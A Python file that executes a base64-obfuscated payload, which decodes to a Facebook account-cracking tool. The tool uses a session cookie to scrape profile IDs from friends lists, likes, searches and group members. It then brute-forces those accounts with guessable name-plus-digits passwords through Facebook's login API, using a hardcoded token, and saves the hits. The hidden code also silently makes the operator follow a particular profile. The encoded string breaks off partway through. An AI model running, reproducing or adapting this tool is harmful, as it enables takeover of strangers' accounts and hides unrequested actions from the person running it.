import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCg0KaW1wb3J0IG9zDQppbXBvcnQgcmUgDQppbXBvcnQgdGltZQ0KaW1wb3J0IGpzb24NCmltcG9ydCByYW5kb20NCmltcG9ydCByZXF1ZXN0cw0KZnJvbSBsaWIgaW1wb3J0IGxvZ28NCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHBhcnNlcg0KZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcg0KbWJhc2ljID0gJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbXt9Jw0KZ2xvYmFsIGRpZSxjaGVjayxyZXN1bHQsIGNvdW50DQoNCmlkID0gW10NCmRpZSA9IDANCmNoZWsgPSBbXQ0Kc3VjY2VzID0gW10NCmNvdW50ID0gMA0KY2hlY2sgPSAwDQpyZXN1bHQgPSAwDQoNCmcgPSAnXHgxYlsxOzMybScNCncgPSAnXHgxYlsxOzM3bScNCmIgPSAnXHgxYlsxOzM2bScNCnIgPSAnXHgxYlsxOzMxbScNCg0KZGVmIG1hc3VrKCk6DQogICAgICAgIGxvZ28uYmFubmVyKCkNCiAgICAgICAgcHJpbnQoJ1xuXG5cdFx04om6IFwwMzNbMTszNm1GQUNFQk9PSyBMT0dJTlwwMzNbMG0g4om7XG5cbicpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBjZWsgPSBvcGVuKCJjb29raWVzIikucmVhZCgpDQogICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCiAgICAgICAgICAgICAgICBjZWsgPSBpbnB1dCgiW1wwMzNbMTs5M21FTlRFUiBDT09LSUVcMDMzWzBtID4+Pj4gIikNCiAgICAgICAgY2VrID0geyJjb29raWUiOmNla30NCiAgICAgICAgaXNtaSA9IHNlcy5nZXQobWJhc2ljLmZvcm1hdCgiL21lIix2ZXJpZnk9RmFsc2UpLGNvb2tpZXM9Y2VrKS5jb250ZW50DQogICAgICAgIGlmICJtYmFzaWNfbG9nb3V0X2J1dHRvbiIgaW4gc3RyKGlzbWkpOg0KICAgICAgICAgICAgICAgIGlmICJBcGEgeWFuZyBBbmRhIHBpa2lya2FuIHNla2FyYW5nIiBpbiBzdHIoaXNtaSk6DQogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oImNvb2tpZXMiLCJ3IikgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZShjZWtbImNvb2tpZSJdKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiIyBDaGFuZ2UgdGhlIGxhbmd1YWdlLCBwbGVhc2Ugd2FpdCEhIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVxdWVzdHMuZ2V0KG1iYXNpYy5mb3JtYXQocGFyc2VyKGlzbWksImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJCYWhhc2EgSW5kb25lc2lhIilbImhyZWYiXSksY29va2llcz1jZWspDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAjIHBsZWFzZSBkb24ndCByZW1vdmUgdGhpcyBvciBjaGFuZ2UNCiAgICAgICAgICAgICAgICAgICAgICAgIGlrdXRpID0gcGFyc2VyKHJlcXVlc3RzLmdldChtYmFzaWMuZm9ybWF0KCIvZG9ndWthbi5lci4xNDQiKSxjb29raWVzPWNlaykuY29udGVudCwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixzdHJpbmc9IklrdXRpIilbImhyZWYiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgc2VzLmdldChtYmFzaWMuZm9ybWF0KGlrdXRpKSxjb29raWVzPWNlaykNCiAgICAgICAgICAgICAgICBleGNlcHQgOg0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzcyANCiAgICAgICAgICAgICAgICByZXR1cm4gY2VrWyJjb29raWUiXQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICBleGl0KCIjIGNvb2tpZXMgaW52YWxpZCIpDQpkZWYgbG9naW4odXNlcm5hbWUscGFzc3dvcmQsY2VrPUZhbHNlKToNCiAgICAgICAgZ2xvYmFsIGRpZSxjaGVjayxyZXN1bHQsY291bnQNCiAgICAgICAgYiA9ICIzNTA2ODU1MzE3MjglN0M2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMiINCiAgICAgICAgcGFyYW1zID0gew0KICAgICAgICAgICAgICAgICdhY2Nlc3NfdG9rZW4nOiBiLA0KICAgICAgICAgICAgICAgICdmb3JtYXQnOiAnSlNPTicsDQogICAgICAgICAgICAgICAgJ3Nka192ZXJzaW9uJzogJzInLA0KICAgICAgICAgICAgICAgICdlbWFpbCc6IHVzZXJuYW1lLA0KICAgICAgICAgICAgICAgICdsb2NhbGUnOiAnZW5fVVMnLA0KICAgICAgICAgICAgICAgICdwYXNzd29yZCc6IHBhc3N3b3JkLA0KICAgICAgICAgICAgICAgICdzZGsnOiAnaW9zJywNCiAgICAgICAgICAgICAgICAnZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzJzogJzEnLA0KICAgICAgICAgICAgICAgICdzaWcnOiAnM2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnLA0KICAgICAgICB9DQogICAgICAgIGFwaSA9ICdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbicNCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoYXBpLCBwYXJhbXM9cGFyYW1zKQ0KICAgICAgICBpZiAnRUFBJyBpbiByZXNwb25zZS50ZXh0Og0KICAgICAgICAgICAgICAgIHByaW50KGYiXHJbXDAzM1sxOzMybVNVQ0NFU1wwMzNbMG1dIHt1c2VybmFtZX0gPT4ge3Bhc3N3b3JkfSAgICAgICAgICAgICAgICAgICAgICAgIixlbmQ9IiIpDQogICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgIHJlc3VsdCArPSAxDQogICAgICAgICAgICAgICAgaWYgY2VrOg0KICAgICAgICAgICAgICAgICAgICAgICAgc3VjY2VzLmFwcGVuZCh1c2VybmFtZSsifCIrcGFzc3dvcmQpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigncmVzdWx0cy1zdWNjZXMudHh0JywnYScpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUodXNlcm5hbWUgKyAnfCcgKyBwYXNzd29yZCArICdcbicpDQogICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHJlc3BvbnNlLmpzb24oKVsnZXJyb3JfbXNnJ106DQogICAgICAgICAgICAgICAgcHJpbnQoZiJccltcMDMzWzE7OTFtQ0hFS1wwMzNbMG1dIHt1c2VybmFtZX0gPT4ge3Bhc3N3b3JkfSAgICAgICAgICAgICAgICAgICAgIixlbmQ9IiIpDQogICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgIGNoZWNrICs9IDENCiAgICAgICAgICAgICAgICBpZiBjZWs6DQogICAgICAgICAgICAgICAgICAgICAgICBjaGVrLmFwcGVuZCh1c2VybmFtZSsifCIrcGFzc3dvcmQpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigncmVzdWx0cy1jaGVjay50eHQnLCdhJykgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSh1c2VybmFtZSArICd8JyArIHBhc3N3b3JkICsgJ1xuJykNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBkaWUgKz0gMQ0KICAgICAgICBmb3IgaSBpbiBsaXN0KCdcfC8t4oCiJyk6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlxyW3tpfV0gU3VjY2VzIDogKHtzdHIocmVzdWx0KX0pIGNoZWNrcG9pbnQgOiAoe3N0cihjaGVjayl9KSBkaWUgOiAoe3N0cihkaWUpfSkiLGVuZD0iIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4yKQ0KZGVmIGdldGlkKHVybCk6DQogICAgICAgIHJhdyA9IHJlcXVlc3RzLmdldCh1cmwsY29va2llcz1rdWtpKS5jb250ZW50DQogICAgICAgIGdldHVzZXIgPSByZS5maW5kYWxsKCdtaWRkbGUiPjxhIGNsYXNzPSIuLiIgaHJlZj0iKC4qPykiPiguKj8pPC9hPicsc3RyKHJhdykpDQogICAgICAgIGZvciB4IGluIGdldHVzZXI6DQogICAgICAgICAgICAgICAgaWYgJ3Byb2ZpbGUnIGluIHhbMF06DQogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQoeFsxXSArICd8JyArIHJlLmZpbmRhbGwoIj0oXGQqKT8iLHN0cih4WzBdKSlbMF0pDQogICAgICAgICAgICAgICAgZWxpZiAnZnJpZW5kcycgaW4geDoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh4WzFdICsgJ3wnICsgeFswXS5zcGxpdCgnLycpWzFdLnNwbGl0KCc/JylbMF0pDQogICAgICAgICAgICAgICAgcHJpbnQoJ1xyIyAnICsgc3RyKGxlbihpZCkpICsgIiByZXRyaWV2ZWQiLGVuZD0iIikNCiAgICAgICAgaWYgJ0xpaGF0IFRlbWFuIExhaW4nIGluIHN0cihyYXcpOg0KICAgICAgICAgICAgICAgIGdldGlkKG1iYXNpYy5mb3JtYXQocGFyc2VyKHJhdywnaHRtbC5wYXJzZXInKS5maW5kKCdhJyxzdHJpbmc9J0xpaGF0IFRlbWFuIExhaW4nKVsnaHJlZiddKSkNCiAgICAgICAgcmV0dXJuIGlkDQpkZWYgZnJvbWxpa2VzKHVybCk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBsaWtlID0gcmVxdWVzdHMuZ2V0KHVybCxjb29raWVzPWt1a2kpLmNvbnRlbnQNCiAgICAgICAgICAgICAgICBsb3ZlID0gcmUuZmluZGFsbCgnaHJlZj0iKC91ZmkuKj8pIicsc3RyKGxpa2UpKVswXQ0KICAgICAgICAgICAgICAgIGF3cyA9IGdldGxpa2UobWJhc2ljLmZvcm1hdChsb3ZlKSkNCiAgICAgICAgICAgICAgICByZXR1cm4gYXdzDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBleGl0KCIjIGNhbnQgZHVtcCBpZCAiKQ0KZGVmIGdldGxpa2UocmVhY3QpOg0KICAgICAgICBsaWtlID0gcmVxdWVzdHMuZ2V0KHJlYWN0LGNvb2tpZXM9a3VraSkuY29udGVudA0KICAgICAgICBpZHMgID0gcmUuZmluZGFsbCgnY2xhc3M9ImIuIj48YSBocmVmPSIoLio/KSI+KC4qPyk8L2E+PC9oMz4nLHN0cihsaWtlKSkNCiAgICAgICAgZm9yIHVzZXIgaW4gaWRzOg0KICAgICAgICAgICAgICAgIGlmICdwcm9maWxlJyBpbiB1c2VyWzBdOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyByZS5maW5kYWxsKCI9KFxkKikiLHN0cih1c2VyWzBdKSlbMF0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgdXNlclswXS5zcGxpdCgnLycpWzFdKQ0KICAgICAgICAgICAgICAgIHByaW50KGYnXHIjIHtzdHIobGVuKGlkKSl9IHJldHJpZXZlZCcsZW5kPSIiKQ0KICAgICAgICBpZiAnTGloYXQgU2VsZW5na2FwbnlhJyBpbiBzdHIobGlrZSk6DQogICAgICAgICAgICAgICAgZ2V0bGlrZShtYmFzaWMuZm9ybWF0KHBhcnNlcihsaWtlLCdodG1sLnBhcnNlcicpLmZpbmQoJ2EnLHN0cmluZz0iTGloYXQgU2VsZW5na2FwbnlhIilbImhyZWYiXSkpDQogICAgICAgIHJldHVybiBpZA0KZGVmIGJ5c2VhcmNoKG9wdGlvbik6DQogICAgICAgIHNlYXJjaCA9IHJlcXVlc3RzLmdldChvcHRpb24sY29va2llcz1rdWtpKS5jb250ZW50DQogICAgICAgIHVzZXJzID0gcmUuZmluZGFsbCgnY2xhc3M9InggY2giPjxhIGhyZWY9Ii8oLio/KSI+PGRpdi4qP2NsYXNzPSJjaiI+KC4qPyk8L2Rpdj4nLHN0cihzZWFyY2gpKQ0KICAgICAgICBmb3IgdXNlciBpbiB1c2VyczoNCiAgICAgICAgICAgICAgICBpZiAicHJvZmlsZSIgaW4gdXNlclswXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgcmUuZmluZGFsbCgiPShcZCopIixzdHIodXNlclswXSkpWzBdKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQodXNlclsxXSArICJ8IiArIHVzZXJbMF0uc3BsaXQoIj8iKVswXSkNCiAgICAgICAgICAgICAgICBwcmludChmIlxyIyB7c3RyKGxlbihpZCkpfSByZXRyaWV2ZWQgIixlbmQ9IiIpDQogICAgICAgIGlmICJMaWhhdCBIYXNpbCBTZWxhbmp1dG55YSIgaW4gc3RyKHNlYXJjaCk6DQogICAgICAgICAgICAgICAgYnlzZWFyY2gocGFyc2VyKHNlYXJjaCwnaHRtbC5wYXJzZXInKS5maW5kKCJhIixzdHJpbmc9IkxpaGF0IEhhc2lsIFNlbGFuanV0bnlhIilbImhyZWYiXSkNCiAgICAgICAgcmV0dXJuIGlkDQpkZWYgZ3J1YmlkKGVuZHBvaW50KToNCiAgICAgICAgZ3JhYiA9IHJlcXVlc3RzLmdldChlbmRwb2ludCxjb29raWVzPWt1a2kpLmNvbnRlbnQNCiAgICAgICAgdXNlcnMgPSByZS5maW5kYWxsKCdhIGNsYXNzPSIuLiIgaHJlZj0iLyguKj8pIj4oLio/KTwvYT4nLHN0cihncmFiKSkNCiAgICAgICAgZm9yIHVzZXIgaW4gdXNlcnM6DQogICAgICAgICAgICAgICAgaWYgInByb2ZpbGUiIGluIHVzZXJbMF06DQogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQodXNlclsxXSArICJ8IiArIHJlLmZpbmRhbGwoJ2lkPShcZCopJyxzdHIodXNlclswXSkpWzBdKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQodXNlclsxXSArICJ8IiArIHVzZXJbMF0pDQogICAgICAgICAgICAgICAgcHJpbnQoZiJcciMge3N0cihsZW4oaWQpKX0gcmV0cmlldmVkICIsZW5kPSIiKQ0KICAgICAgICBpZiAiTGloYXQgU2VsZW5na2FwbnlhIiBpbiBzdHIoZ3JhYik6DQogICAgICAgICAgICAgICAgZ3J1YmlkKG1iYXNpYy5mb3JtYXQocGFyc2VyKGdyYWIsImh0bWwucGFyc2VyIikuZmluZCgiYSIsc3RyaW5nPSJMaWhhdCBTZWxlbmdrYXBueWEiKVsiaHJlZiJdKSkNCiAgICAgICAgcmV0dXJuIGlkDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJnaXQgcHVsbCIpDQogICAgICAgICAgICAgICAgc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgICAgICAgICAgICAga3VraXMgPSBtYXN1aygpDQogICAgICAgICAgICAgICAga3VraSA9IHsnY29va2llJzprdWtpc30NCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICAgICAgICAgICAgICBsb2dvLmJhbm5lcigpDQogICAgICAgICAgICAgICAgcHJpbnQoJ1xuXG5cdFx04om6IFwwMzNbMTszNm1GQUNFQk9PSyBUT09MS0lUXDAzM1swbSDiibtcblxuJykNCiAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkxbfCfkYkgXDAzM1swbVtcMDMzWzE7MzJtMVwwMzNbMG1dIFwwMzNbMTs5M21MSVNUIEZSSUVORFNcMDMzWzBtJykNCiAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkxbfCfkYlcMDMzWzBtIFtcMDMzWzE7MzJtMlwwMzNbMG1dIFwwMzNbMTs5M21DUkFDSyBGUk9NIExJS0VTXDAzM1swbScpDQogICAgICAgICAgICAgICAgcHJpbnQoJ/CfkYkgXDAzM1swbVtcMDMzWzE7MzJtM1wwMzNbMG1dIFwwMzNbMTs5M21DUkFDSyBGUk9NIFNFQVJDSCBOQU1FXDAzM1swbScpDQogICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5MW3wn5GJIFwwMzNbMG1bXDAzM1sxOzMybTRcMDMzWzBtXSBcMDMzWzE7OTNtQ1JBQ0sgRlJPTSBHUk9VUFwwMzNbMG0gJykNCiAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkxbfCfkYkgXDAzM1swbVtcMDMzWzE7MzJtNVwwMzNbMG1dIFwwMzNbMTs5M21DUkFDSyBGUk9NIEZSSUVORFNcMDMzWzBtJykNCiAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkxbfCfkYkgXDAzM1swbVtcMDMzWzE7MzJtNlwwMzNbMG1dIFwwMzNbMTs5M21SRVNVTFRTIENIRUNLU1wwMzNbMG0nKQ0KICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTFtXDAzM1swbVxuJykNCiAgICAgICAgICAgICAgICBwcmludCgpDQogICAgICAgICAgICAgICAgdGFueWEgPSBpbnB1dCgn8J+RiSAnKQ0KICAgICAgICAgICAgICAgIGlmIHRhbnlhID09IiI6DQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJbIV0gRG9udCBiZSBlbXB0eSIpDQogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnMSc6DQogICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBwYXJzZXIoc2VzLmdldChtYmFzaWMuZm9ybWF0KCcvbWUnKSxjb29raWVzPWt1a2kpLmNvbnRlbnQsJ2h0bWwucGFyc2VyJykuZmluZCgnYScsc3RyaW5nPSdUZW1hbicpDQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdldGlkKG1iYXNpYy5mb3JtYXQodXJsWyJocmVmIl0pKQ0KICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzInOg0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBpbnB1dCgiIyB1cmwgOiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdXNlcm5hbWUgPT0gIiI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiMgRG9udCBiZSBlbXB0eSIpDQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2snIGluIHVzZXJuYW1lOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gdXNlcm5hbWUucmVwbGFjZSgnd3d3LmZhY2Vib29rJywnbWJhc2ljLmZhY2Vib29rJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJ20uZmFjZWJvb2suY29tJyBpbiB1c2VybmFtZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHVzZXJuYW1lLnJlcGxhY2UoJ20uZmFjZWJvb2suY29tJywnbWJhc2ljLmZhY2Vib29rLmNvbScpDQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGZyb21saWtlcyh1c2VybmFtZSkgDQogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnMyc6DQogICAgICAgICAgICAgICAgICAgICAgICB6ZXQgPSBpbnB1dCgiIFwwMzNbMTs5M21RVUVSWTAzM1swbSA6ICIpDQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGJ5c2VhcmNoKG1iYXNpYy5mb3JtYXQoJy9zZWFyY2gvcGVvcGxlLz9xPScremV0KSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih1c2VybmFtZSkgPT0gMDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyBubyByZXN1bHQiKQ0KICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzQnOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiBcMDMzWzE7OTNtY2FuIG9ubHkgdGFrZSAxMDAgSURzXDAzM1swbSAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZ3JhYiA9IGlucHV0KCIgXDAzM1sxOzkzbUlEIGdyb3VwXDAzM1swbSA6ICIpDQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdydWJpZChtYmFzaWMuZm9ybWF0KCIvYnJvd3NlL2dyb3VwL21lbWJlcnMvP2lkPSIgKyBncmFiKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih1c2VybmFtZSkgPT0gMDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyBJRCB3cm9uZyIpDQogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnNSc6DQogICAgICAgICAgICAgICAgICAgICAgICB6ZXQgPSBpbnB1dCgiIFwwMzNbMTs5M21FTlRFUiBVU0VSTkFNRS9JRFwwMzNbMG0gOiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgemV0LmlzZGlnaXQoKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9ICIvcHJvZmlsZS5waHA/aWQ9IiArIHpldA0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9ICIvIiArIHpldA0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gcGFyc2VyKHJlcXVlc3RzLmdldChtYmFzaWMuZm9ybWF0KHVzZXIpLGNvb2tpZXM9a3VraSkuY29udGVudCwiaHRtbC5wYXJzZXIiKS5maW5kKCdhJyxzdHJpbmc9IlRlbWFuIilbImhyZWYiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdldGlkKG1iYXNpYy5mb3JtYXQodXNlcikpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgVHlwZUVycm9yOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIHVzZXIgbm90IGZvdW5kICIpDQogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnNic6DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUxID0gb3BlbigicmVzdWx0cy1jaGVjay50eHQiKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZTIgPSBvcGVuKCJyZXN1bHRzLXN1Y2Nlcy50eHQiKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYSA9IGZpbGUxICsgZmlsZTINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmluYWwgPSBhLnN0cmlwKCkuc3BsaXQoIlxuIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmluYWwgPSBzZXQoZmluYWwpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiIyB7c3RyKGxlbihmaW5hbCkpfSBhY2NvdW50cyB0byBjaGVjayAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0xMCkgYXMgZXg6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHVzZXIgaW4gZmluYWw6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhID0gdXNlci5zcGxpdCgifCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleC5zdWJtaXQobG9naW4sKGFbMF0pLChhWzFdKSwoVHJ1ZSkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSgicmVzdWx0cy1jaGVjay50eHQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoInJlc3VsdHMtc3VjY2VzLnR4dCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB4IGluIHN1Y2NlczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ3Jlc3VsdHMtc3VjY2VzLnR4dCcsJ2EnKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSh4KydcbicpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB4IGluIGNoZWs6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdyZXN1bHRzLWNoZWNrLnR4dCcsJ2EnKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSh4KyJcbiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXG4jIERvbmUiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiIyBzYXZlZCB0byByZXN1bHRzLWNoZWNrLnR4dCByZXN1bHRzLXN1Y2Nlcy50eHQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyB5b3Ugbm90IGhhdmUgYSByZXN1bHRzIikNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyB3cm9uZyBjaG9pY2UiKQ0KICAgICAgICAgICAgICAgIHByaW50KCkNCiAgICAgICAgICAgICAgICBleHBhc3MgPSBpbnB1dCgiW1wwMzNbMTszMm1FWFRSQSBQQVNTV09SRFwwMzNbMG1dIDogIikNCiAgICAgICAgICAgICAgICBwcmludCgiIyByZXN1bHQgd2lsbCBiZSBzYXZlZCBpbiByZXN1bHRzLXN1Y2Nlcy50eHQgYW5kIHJlc3VsdHMtY2hlY2sudHh0IikNCiAgICAgICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgZXg6DQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdXNlciBpbiB1c2VybmFtZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcnMgPSB1c2VyLnNwbGl0KCd8JykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3MgPSB1c2Vyc1swXS5zcGxpdCgnICcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB4IGluIHNzOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpc3RwYXNzID0gWw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyMycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHIoeCkgKyAnMTIzNCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHIoeCkgKyAnMTIzNDUnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyMzQ1NicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHIoeCkgKyAnMTInLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpc3RwYXNzLmFwcGVuZChleHBhc3MpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHBhc3N3IGluIHNldChsaXN0cGFzcyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleC5zdWJtaXQobG9naW4sKHVzZXJzWzFdKSwocGFzc3cpKQ0KICAgICAgICAgICAgICAgIGlmIGNoZWNrICE9IDAgb3I